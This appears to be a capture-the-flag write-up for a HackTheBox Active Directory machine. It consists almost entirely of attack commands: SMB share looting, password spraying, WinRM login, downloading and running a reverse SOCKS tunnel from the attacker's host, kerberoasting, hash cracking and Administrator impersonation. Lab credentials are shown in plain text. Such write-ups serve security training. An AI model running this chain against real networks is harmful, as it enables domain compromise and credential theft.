...
Looking at port 445 (smb) we could see the machine is a domain controller.

```
Tue Jul 27 02:43:54 wil@pwn:~/htb/business_ctf/boxes/cycle$ smbclient -U " "%" " -L //cycle.htb/
...
```
Tue Jul 27 02:45:40 wil@pwn:~/htb/business_ctf/boxes/cycle$ smbclient -U " "%" " //cycle.htb/Backups
mkdir failed on directory /var/run/samba/msg.lock: Permission denied
Unable to initialize messaging context
...
`sqlsvc:T7Fjr526aD67tGJQ`

Credentials are valid on the domain (confirmed by crackmapexec).
```
Tue Jul 27 02:49:11 wil@pwn:~/htb/business_ctf/boxes/cycle$ cme smb cycle.htb -u sqlsvc -p T7Fjr526aD67tGJQ
...
```
Tue Jul 27 02:51:37 wil@pwn:~/htb/business_ctf/boxes/cycle$ rpcclient -W MEGACORP.LOCAL cycle.htb -U 'sqlsvc%T7Fjr526aD67tGJQ' -c enumdomusers
...
```
Tue Jul 27 02:51:55 wil@pwn:~/htb/business_ctf/boxes/cycle$ cme smb cycle.htb -u users.txt -p 'Meg@CorP20!' --continue-on-success
...
```
Tue Jul 27 02:55:27 wil@pwn:~/htb/business_ctf/boxes/cycle$ evil-winrm -u WLee -p 'Meg@CorP20!' -i cycle.htb
...
```
Tue Jul 27 02:56:52 wil@pwn:~/tools$ ./revsocks -listen 10.10.14.27:11000 -socks 127.0.0.1:1100 -pass astrongpasswordfc
```
```
*Evil-WinRM* PS C:\windows\temp> curl 10.10.14.27/revsocks.exe -o revsocks.exe
*Evil-WinRM* PS C:\windows\temp\mine> .\revsocks.exe -connect 10.10.14.27:11000 -pass astrongpasswordfc
```

We also run bloodhound and discover few interesting things. First one: we can kerberoast GFisher user.
```
Tue Jul 27 03:02:32 wil@pwn:~/htb/business_ctf/boxes/cycle$ proxychains GetUserSPNs.py MEGACORP.LOCAL/sqlsvc:T7Fjr526aD67tGJQ -request
...
Tue Jul 27 03:03:52 wil@pwn:~/htb/business_ctf/boxes/cycle$ john fisher.hash --wordlist=rockyou.txt
...
```
Tue Jul 27 03:19:16 wil@pwn:~/htb/business_ctf/boxes/cycle$ proxychains getST.py -spn MSSQL/DC01.MEGACORP.LOCAL -impersonate Administrator MEGACORP.LOCAL/GFISHER:'escorpion10'
Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation
